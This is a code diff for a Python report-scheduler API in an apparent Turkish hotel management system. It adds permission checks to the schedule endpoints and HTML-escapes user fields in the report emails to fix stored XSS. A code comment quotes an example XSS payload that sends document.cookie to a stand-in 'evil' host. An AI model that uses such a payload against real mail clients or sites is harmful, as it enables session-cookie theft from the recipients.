@@ -15,6 +15,7 @@ Endpoints:
   GET    /api/report-scheduler/report-types       — Mevcut rapor tipleri
 """
 import logging
+from modules.pms_core.role_permission_service import require_op  # v98 DW
 import re as _re
 import traceback
 import uuid
@@ -186,7 +187,9 @@ async def get_report_types(current_user: User = Depends(get_current_user)):
 
 
 @router.post("/schedules")
-async def create_schedule(body: ScheduleCreate, current_user: User = Depends(get_current_user)):
+async def create_schedule(body: ScheduleCreate, current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("view_reports")),  # v98 DW
+):
     _require_manager_role(current_user)
 
     data = body.model_dump()
@@ -231,7 +234,9 @@ async def get_schedule(schedule_id: str, current_user: User = Depends(get_curren
 
 
 @router.put("/schedules/{schedule_id}")
-async def update_schedule(schedule_id: str, body: ScheduleUpdate, current_user: User = Depends(get_current_user)):
+async def update_schedule(schedule_id: str, body: ScheduleUpdate, current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("view_reports")),  # v98 DW
+):
     _require_manager_role(current_user)
 
     schedule = await _get_schedule_for_tenant(schedule_id, current_user)
@@ -254,7 +259,9 @@ async def update_schedule(schedule_id: str, body: ScheduleUpdate, current_user: 
 
 
 @router.delete("/schedules/{schedule_id}")
-async def delete_schedule(schedule_id: str, current_user: User = Depends(get_current_user)):
+async def delete_schedule(schedule_id: str, current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("view_reports")),  # v98 DW
+):
     _require_manager_role(current_user)
 
     await _get_schedule_for_tenant(schedule_id, current_user)
@@ -265,7 +272,9 @@ async def delete_schedule(schedule_id: str, current_user: User = Depends(get_cur
 
 
 @router.post("/schedules/{schedule_id}/toggle")
-async def toggle_schedule(schedule_id: str, current_user: User = Depends(get_current_user)):
+async def toggle_schedule(schedule_id: str, current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("view_reports")),  # v98 DW
+):
     _require_manager_role(current_user)
 
     schedule = await _get_schedule_for_tenant(schedule_id, current_user)
@@ -283,7 +292,9 @@ async def toggle_schedule(schedule_id: str, current_user: User = Depends(get_cur
 
 
 @router.post("/schedules/{schedule_id}/send-now")
-async def send_now(schedule_id: str, current_user: User = Depends(get_current_user)):
+async def send_now(schedule_id: str, current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("view_reports")),  # v98 DW
+):
     _require_manager_role(current_user)
 
     schedule = await _get_schedule_for_tenant(schedule_id, current_user)
@@ -321,7 +332,9 @@ async def get_history_detail(history_id: str, current_user: User = Depends(get_c
 
 
 @router.post("/history/{history_id}/retry")
-async def retry_send(history_id: str, current_user: User = Depends(get_current_user)):
+async def retry_send(history_id: str, current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("view_reports")),  # v98 DW
+):
     _require_manager_role(current_user)
 
     entry = await _get_history_for_tenant(history_id, current_user)
@@ -453,9 +466,18 @@ async def _execute_schedule(schedule: dict, triggered_by: str = "system", histor
 
 
 def _build_report_email_html(schedule: dict, report_label: str, now: datetime) -> str:
-    fmt = schedule.get("format", "pdf").upper()
+    # Bug AQ (April 2026): schedule.name and schedule.notes are user-controlled
+    # at /api/reports/schedule create time. Without escaping, an attacker who
+    # creates a schedule named `<img src=x onerror=fetch('http://evil/'+document.cookie)>`
+    # would land their payload in every recipient's mailbox.
+    import html as _html_mod
+    def _e(v): return _html_mod.escape("" if v is None else str(v), quote=True)
+    fmt = _e(schedule.get("format", "pdf").upper())
     freq_labels = {"daily": "Günlük", "weekly": "Haftalık", "monthly": "Aylık"}
-    freq_label = freq_labels.get(schedule.get("frequency", ""), schedule.get("frequency", ""))
+    freq_label = _e(freq_labels.get(schedule.get("frequency", ""), schedule.get("frequency", "")))
+    sched_name = _e(schedule.get('name', '-'))
+    sched_notes = _e(schedule.get('notes')) if schedule.get('notes') else None
+    report_label = _e(report_label)
 
     return f"""
     <!DOCTYPE html>
@@ -490,13 +512,13 @@ def _build_report_email_html(schedule: dict, report_label: str, now: datetime) -
                     <tr><td>Frekans</td><td>{freq_label}</td></tr>
                     <tr><td>Format</td><td>{fmt}</td></tr>
                     <tr><td>Olusturulma</td><td>{now.strftime('%d.%m.%Y %H:%M')}</td></tr>
-                    <tr><td>Zamanlama</td><td>{schedule.get('name', '-')}</td></tr>
+                    <tr><td>Zamanlama</td><td>{sched_name}</td></tr>
                 </table>
                 <p>Raporu goruntulemek icin asagidaki butona tiklayabilirsiniz:</p>
                 <p style="text-align: center;">
                     <a href="https://syroce.com/app/raporlar" class="button">Raporu Goruntule</a>
                 </p>
-                {f'<p><em>Not: {schedule.get("notes")}</em></p>' if schedule.get("notes") else ''}
+                {f'<p><em>Not: {sched_notes}</em></p>' if sched_notes else ''}
             </div>
             <div class="footer">
                 <p>Syroce Otel Yonetim Sistemi</p>
